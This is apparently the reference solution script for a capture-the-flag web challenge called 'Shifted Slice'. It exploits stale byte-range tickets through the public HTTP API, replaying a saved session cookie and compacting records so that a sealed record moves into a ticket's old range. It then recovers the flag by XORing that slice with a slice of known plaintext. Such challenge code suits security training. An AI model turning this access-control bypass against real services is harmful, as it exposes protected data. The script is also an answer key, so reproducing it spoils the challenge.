#!/usr/bin/env python3
"""Reference solve for Shifted Slice using only the public HTTP API."""

import copy
import json
import re
import sys
from http.cookiejar import CookieJar, DefaultCookiePolicy
from urllib.error import HTTPError
from urllib.request import HTTPCookieProcessor, Request, build_opener


FLAG = re.compile(rb"wctf\{[0-9a-f]{32}\}")
SUFFIX = re.compile(rb"\{[0-9a-f]{32}\}")


def solve(base_url):
    base = base_url.rstrip("/")
    cookies = CookieJar(policy=DefaultCookiePolicy(secure_protocols=("https", "http")))
    client = build_opener(HTTPCookieProcessor(cookies))

    def request(method, path, body=None, headers=None, status=200):
        data = None if body is None else json.dumps(body).encode("ascii")
        headers = dict(headers or {})
        if data is not None:
            headers["Content-Type"] = "application/json"
        req = Request(base + path, data=data, headers=headers, method=method)
        try:
            response = client.open(req, timeout=10)
        except HTTPError as error:
            response = error
        with response:
            actual, payload = response.status, response.read()
        if actual != status:
            raise RuntimeError(f"{method} {path}: expected HTTP {status}, got {actual}")
        return payload

    manifest = json.loads(request("GET", "/api/manifest"))
    keys = [record["key"] for record in manifest["records"]]
    if keys != ["m-sealed", "p-public", "z-owned", "zz-scratch"]:
        raise RuntimeError("unexpected initial bundle order")
    if manifest["total_bytes"] != 304 or [r["bytes"] for r in manifest["records"]] != [64, 48, 64, 128]:
        raise RuntimeError("unexpected initial frame layout")

    issued = json.loads(request("POST", "/api/tickets", {"key": "z-owned"}))
    if issued["revision"] != manifest["revision"]:
        raise RuntimeError("the bundle changed while the ticket was issued")
    headers = {"Authorization": "Bearer " + issued["ticket"], "Range": issued["range"]}
    pristine_cookie = copy.copy(next(iter(cookies)))

    request("POST", "/api/records", {"key": "q-public", "text": "x" * 40}, status=201)
    request("POST", "/api/compact", {})
    known_layout = json.loads(request("GET", "/api/manifest"))
    if known_layout["total_bytes"] != 304 or [r["key"] for r in known_layout["records"]] != ["m-sealed", "p-public", "q-public", "z-owned", "zz-scratch"]:
        raise RuntimeError("the known public record did not move into the old owned slot")
    known_slice = request("GET", "/api/bundle", headers=headers, status=206)

    cookies.set_cookie(pristine_cookie)
    request("POST", "/api/records", {"key": "a-public", "text": "x" * 40}, status=201)
    request("POST", "/api/refile", {"from": "p-public", "to": "b-public"})
    request("POST", "/api/compact", {})
    current = json.loads(request("GET", "/api/manifest"))
    if [record["key"] for record in current["records"]] != ["a-public", "b-public", "m-sealed", "z-owned", "zz-scratch"]:
        raise RuntimeError("the sealed record did not move into the old owned slot")
    if current["total_bytes"] != manifest["total_bytes"]:
        raise RuntimeError("the bundle size changed")
    if current["revision"] == issued["revision"]:
        raise RuntimeError("the refile did not create a new bundle revision")

    sealed_slice = request("GET", "/api/bundle", headers=headers, status=206)
    if len(known_slice) != 64 or len(sealed_slice) != len(known_slice):
        raise RuntimeError("the ticket did not return one complete record")
    for offset in range(len(known_slice) - 40 + 1):
        recovered = bytes(a ^ b ^ ord("x") for a, b in zip(known_slice[offset:offset + 40], sealed_slice[offset:offset + 40]))
        match = SUFFIX.search(recovered)
        if match is not None:
            flag = b"wctf" + match.group()
            if FLAG.fullmatch(flag):
                return flag.decode("ascii")
    raise RuntimeError("the two stale slices did not recover the sealed flag")


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"))
